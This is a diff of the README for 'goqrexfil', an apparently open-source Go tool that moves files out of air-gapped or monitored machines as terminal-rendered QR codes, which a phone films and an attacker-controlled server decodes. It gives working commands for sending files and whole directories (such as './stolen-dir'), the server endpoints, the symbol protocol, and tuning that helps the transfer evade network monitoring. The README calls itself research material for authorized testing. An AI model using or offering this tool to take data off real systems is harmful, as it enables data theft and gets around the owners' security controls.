@@ -4,33 +4,41 @@ Exfiltrate data as **QR codes captured on video** — a cover channel that never
 network.
 
 The idea: data leaves the air-gapped (or monitored) machine by being *looked at*. A client
-displays the payload as a stream of QR codes; a phone records them on video; the video is
-uploaded to a server you control, which extracts the frames, reads every QR code, and
-reassembles the original file. No packets, no USB, no network monitoring alerts — just a
-video file that looks like any other.
+renders the payload as a stream of QR codes **directly in your terminal**; a phone records
+them on video; the video is uploaded to a server you control, which extracts the frames,
+reads every QR code, and reconstructs the original file. No packets, no USB, no network
+monitoring alerts — just a video file that looks like any other.
+
+The pipeline is protected by **RaptorQ fountain coding** (erasure coding): the client emits
+more symbols than are strictly needed, so the server can reconstruct the payload even when
+the video drops frames — no re-recording required in the common case.
 
 ```
-                 client (monitored machine)                          server (your machine)
-                 ──────────────────────────                          ──────────────────────
-  secret file ──► smaz compress ──► base64 ──► 320-byte chunks
+              client (monitored machine)                        server (your machine)
+              ──────────────────────────                        ──────────────────────
+  file / dir / stdin
+        │
+        ▼
+  smaz compress ──► RaptorQ encode ──► symbol stream (k base + redundancy)
                                                         │
-                                          each chunk framed with a sequence number
+                                          each symbol framed + rendered as a
+                                          QR code in the terminal (half-blocks)
                                                         │
                                               ┌─────────▼──────────┐
-                                              │  QR code #1        │   ◄── phone records
-                                              │  QR code #2        │       the window
+                                              │  symbol #1         │   ◄── phone films
+                                              │  symbol #2         │       the terminal
                                               │  ...               │
                                               └─────────┬──────────┘
-                                                        │  video upload (http)
+                                                        │  video upload (http/https)
                                                         ▼
-                                    ffmpeg frame extraction ──► QR recognition (per frame)
+                                     ffmpeg frame extraction ──► QR recognition (per frame)
                                                         │
-                                          dedupe by sequence number, detect gaps
+                                          RaptorQ decode (any solvable subset)
                                                         │
-                                              base64 decode ──► smaz decompress
+                                              smaz decompress
                                                         │
                                                         ▼
-                                                 payload/payload.bin  ✓
+                                                  payload.bin  ✓   (or extracted/ dir)
 ```
 
 ## Requirements
@@ -38,8 +46,8 @@ video file that looks like any other.
 * [Go](https://go.dev) 1.26+
 * [ffmpeg](https://ffmpeg.org) on `PATH` (server mode only)
 * A phone and a steady hand (client mode)
-* Client mode uses [lorca](https://github.com/zserge/lorca) to open a browser window, so it
-  needs Chrome/Chromium ≥ 70 installed
+* A terminal with a **monospace font** — QR codes are drawn with Unicode half-blocks
+  (`█▀▄`), so no browser is needed
 
 ## Build
 
@@ -52,31 +60,32 @@ go build -o goqrexfil .
 **1. Start the server** on a machine you control:
 
 ```sh
-./goqrexfil --server
-# Serving on port 9999
+./goqrexfil --server                 # http://<server>:9999
+./goqrexfil --server --token SECRET  # require a shared token
+./goqrexfil --server --tls           # HTTPS with a self-signed cert (fingerprint printed)
 ```
 
-**2. Record the QR stream** on the monitored machine. Point your phone at the window that
-opens (zoom so the QR fills most of the frame), start recording, wait for the stream, stop:
+**2. Record the QR stream** on the monitored machine. Point your phone at the terminal
+(zoom so the QR fills most of the frame), start recording, wait for the stream, stop:
 
 ```sh
 cat top.secret.file | ./goqrexfil --client
 [*] Client mode: ON
-[*] Loading payload from stdin
+[*] Source: stdin (8.2 KiB)
 Plaintext hash 9f2c...
-[*] Payload will be in 38 chunks
-[***] Start your video, displaying in > 3 < seconds ****
+[*] 38 base symbols, 57 total (redundancy 50%)
+[*] Estimated recording time: ~31s
+[***] Point your phone at this terminal, start recording, then in > 3 < seconds ****
 ```
 
-**3. Upload the video** from your phone to `http://<server>:9999/` and submit. The server
+**3. Upload the video** from your phone to `http://<server>:9999/` (add `?token=SECRET`
+if you set one) and submit. The server reconstructs as soon as it has enough symbols and
 responds with a download link:
 
 ```
 [*] File received
-[*] Retrieving chunk 1 from public/001.png
-[*] Retrieving chunk 2 from public/006.png
-...
-[*] Received 38/38 chunks
+[*] received 25 symbols (need ~38)
+[*] Payload reconstructed from 41 symbols (need ~38)
 [*] Payload saved as  ./payload/payload.bin
 Payload hash 9f2c...
 ```
@@ -84,38 +93,63 @@ Payload hash 9f2c...
 Compare the `Plaintext hash` from step 2 with the `Payload hash` from step 3 — they must
 match. Then download the file from `http://<server>:9999/payload`.
 
-## Reliability: gaps and resume
+## Why it's reliable: fountain coding
 
-Every QR code carries a sequence number (`GQ1:<seq>:` header), so the server reassembles
-chunks **in order**, dedupes repeated frames by index, and — if the video missed a frame —
-tells you exactly what is missing instead of silently producing a corrupt file:
+Each QR code is a **RaptorQ symbol**, not a fixed chunk. The client emits `k` base symbols
+plus a redundancy pool (default 50%), and the server can reconstruct the payload from
+**any** solvable subset of the symbols it captured. That means:
 
-```
-[*] Received 29/38 chunks - MISSING: 4,8,12,16,20,24,28,32,36
-```
+* Dropped frames, motion blur, and missed QRs are absorbed by the redundancy — a typical
+  recording reconstructs on the first try.
+* The server shows live progress (`received N symbols (need ~k)`) and **stops scanning as
+  soon as the payload is decodable**, instead of processing the whole video.
+* If a recording genuinely captured too little, the server tells you — just re-record.
+  Because it's a fountain code, *any* additional symbols help, so there's no "re-record
+  chunks 4, 8, 12" bookkeeping.
 
-The upload page (and the `GET /missing` endpoint) then gives you the chunk numbers to
-re-record. Re-run the client with `--resume` to display **only** those chunks, record a
-second short video, and upload it again:
+Tune the trade-off with `--redundancy` (percent of base symbols): higher = longer video but
+more tolerant of a bad recording.
 
 ```sh
-cat top.secret.file | ./goqrexfil --client --resume 4,8,12,16,20,24,28,32,36
+./goqrexfil --client --redundancy 100 top.secret.file   # very robust, ~2x longer
+```
+
+## Directory and multi-file exfiltration
+
+Point the client at a directory and it packs everything into a tar.gz with a SHA-256
+manifest; the server unpacks it to `./payload/extracted/` and verifies every file against
+the manifest:
+
+```sh
+./goqrexfil --client ./stolen-dir
+[*] Source: stolen-dir (1.2 MiB)
+[*] 5120 base symbols, 7680 total (redundancy 50%)
+[*] Estimated recording time: ~4224s
+```
+
+A single file works the same way: `./goqrexfil --client ./top.secret.pdf`.
+
+**Preview before you record** with `--dry-run` (shows size, symbol count, and time
+estimate, displays nothing):
+
+```sh
+./goqrexfil --client --dry-run ./stolen-dir
 ```
 
 ## Self-test (no camera needed)
 
-Verify the whole encode → QR → decode → reassemble pipeline locally, e.g. after changing
-chunk size or QR settings:
+Verify the whole encode → QR → decode → RaptorQ-reconstruct pipeline locally. It simulates
+an 80% capture and confirms the payload still reconstructs:
 
 ```sh
 cat top.secret.file | ./goqrexfil --selftest
-[*] Self-test mode: local QR round-trip, no camera needed
-[*] Payload will be in 38 chunks
-[*] PASS: round-trip OK, payload hash 9f2c...
+[*] 26 base symbols, 39 total
+[*] PASS: round-trip OK from 80% of symbols, payload hash 9f2c...
 ```
 
-The repo also ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR
-frames and run the full server pipeline, including a dropped-frame scenario:
+The repo ships end-to-end tests (`goqrexfil_test.go`) that build a real mp4 from QR frames
+and run the full server pipeline — including a test that **drops 25% of the symbols and
+still reconstructs the payload**:
 
 ```sh
 go test ./...
@@ -127,63 +161,71 @@ go test ./...
 
 | Flag | Description |
 | --- | --- |
-| `--client` | Read payload from stdin, display QR stream in a browser window |
-| `--client --resume 3,7,12` | Display only the given 1-based chunk numbers (re-record gaps) |
-| `--server` | Web server on port 9999: upload video, extract payload |
-| `--selftest` | Local round-trip test of the QR pipeline, no camera needed |
+| `--client [path]` | Read payload from `path` (file or directory) or stdin, display QR stream |
+| `--client --dry-run` | Show symbol count + time estimate, display nothing |
+| `--client --redundancy N` | RaptorQ redundancy as % of base symbols (default 50) |
+| `--client --no-quiet-zone` | Omit the QR quiet zone to save 8 columns (narrow terminals) |
+| `--server` | Web server on port 9999: upload video, reconstruct payload |
+| `--server --token SECRET` | Require the shared token on upload/download |
+| `--server --tls` | Serve over TLS (self-signed cert, fingerprint printed) |
+| `--server --tls-cert C --tls-key K` | Use your own TLS cert/key |
+| `--selftest [path]` | Local round-trip test of the QR pipeline, no camera needed |
 | `--retrievePayload` | Re-process `./public/video.mp4` without the web server (debug) |
 
 ### Server endpoints
 
 | Endpoint | Description |
 | --- | --- |
-| `GET /` | Upload form |
-| `POST /upload` | Upload the video (multipart field `file`, max 512 MB); returns download link or missing-chunk list |
-| `GET /payload` | Download the reassembled payload |
-| `GET /missing` | 1-based chunk numbers to re-record, formatted for `--resume` |
+| `GET /` | Upload form (add `?token=…` if a token is set) |
+| `POST /upload` | Upload the video (multipart field `file`, max 512 MB); returns download link or a "re-record" notice |
+| `GET /payload` | Download the reconstructed payload |
+| `GET /missing` | Advisory: how the fountain-coded recovery works |
 | `GET /process/` | Static access to extracted frames (debugging) |
 
-### The chunk protocol
+### The symbol protocol
 
-Each QR code encodes `GQ1:<seq>:<data>` where `<seq>` is a zero-padded 6-digit sequence
-number and `<data>` is a ≤320-byte slice of the base64-encoded, smaz-compressed payload.
-The `:` separator cannot appear in base64, so framing is unambiguous.
+Each QR code encodes `GQ2:<compressedLen>:<symbolID>:<base64(symbol)>` where
+`<compressedLen>` is the exact byte length of the smaz-compressed payload (the RaptorQ
+decoder needs it), `<symbolID>` indexes the fountain symbol, and `<base64(symbol)>` is a
+~240-byte RaptorQ symbol. The `:` separators cannot appear in base64, so framing is
+unambiguous.
 
 ## Throughput
 
-Each QR code carries 320 bytes of base64 (≈240 bytes of compressed data) and is held for
-550 ms, so the raw channel runs at roughly **436 compressed bytes/second** (~3.5 kbit/s).
-Base64 inflates the payload by 4/3, so the table below is the **worst case** (incompressible
-data like random or encrypted bytes, where smaz can't shrink it):
+Each QR carries a 240-byte symbol held for 550 ms, and 50% redundancy means you emit 1.5
+symbols per base symbol. RaptorQ pads the symbol count, so treat these as **approximate
+worst-case** (incompressible data) figures — run `--dry-run` for the exact count and time
+for your payload:
 
-| Original size | Chunks | Recording time |
+| Original size | Total symbols (approx) | Recording time (approx) |
 | --- | --- | --- |
-| 1 KB | 5 | ~3 s |
-| 10 KB | 43 | ~25 s |
-| 100 KB | 427 | ~4 min |
-| 1 MB | 4,370 | ~40 min |
-| 10 MB | 43,691 | ~6.7 h |
+| 1 KB | ~9 | ~5 s |
+| 10 KB | ~77 | ~42 s |
+| 100 KB | ~770 | ~7 min |
+| 1 MB | ~7,900 | ~70 min |
+| 10 MB | ~79,000 | ~12 h |
 
 Compressible payloads (text, PDFs, source) shrink under smaz and transfer proportionally
-faster. If a recording misses frames, the resume workflow above recovers the gaps without
-re-recording everything.
+faster. Lower `--redundancy` shortens the video at the cost of less tolerance for a bad
+recording.
 
 ## Tuning
 
 Constants at the top of `goqrexfil.go`:
 
-* `QRCDataMaxBytes` — bytes per QR (320). Higher = fewer chunks but denser, harder-to-scan
-  codes. Run `--selftest` after changing it.
-* `msBetweenFrames` — dwell time per QR (550 ms). Raise it if your phone drops frames.
+* `symbolSize` — bytes per RaptorQ symbol (240 → ~320 base64 chars per QR). Changing it
+  alters QR density; run `--selftest` after changing it.
+* `msBetweenFrames` — dwell time per symbol (550 ms). Raise it if your phone drops frames.
 * `ffmpegImageScale` — frames are extracted at native resolution, capped at 1600 px wide
   for 4K video. Never downscale below ~600 px: QR recognition fails below that.
 
 ## Limitations
 
-* The server is plain HTTP with no authentication — run it on a trusted network or behind
-  a tunnel, and stop it when done.
+* The server is plain HTTP by default with no authentication — use `--token` and/or `--tls`
+  before pointing it at anything but a trusted network, and stop it when done.
 * Recognition quality depends on the recording: steady hand, good lighting, QR filling the
-  frame. The gap/resume workflow exists precisely because some frames will be lost.
+  frame, monospace terminal font. Fountain coding absorbs some loss, but a very bad
+  recording may still need a re-take.
 * This is a research/education project about cover channels. Use it only on systems you own
   or are authorized to test.
 
